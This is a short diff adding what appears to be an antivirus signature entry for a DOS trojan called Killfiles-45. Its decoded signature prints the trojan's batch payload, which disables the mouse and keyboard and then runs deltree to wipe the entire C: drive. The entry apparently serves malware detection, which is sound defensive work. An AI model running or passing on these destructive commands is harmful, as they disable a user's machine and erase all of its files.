@@ -1,0 +1,10 @@
+VIRUS NAME: Dos.Trojan.Killfiles-45
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off@
+c:\windows\rundll.exe mouse,disable
+c:\windows\rundll.exe keyboard,diable
+goto del
+:del
+deltree \y c:\*.*
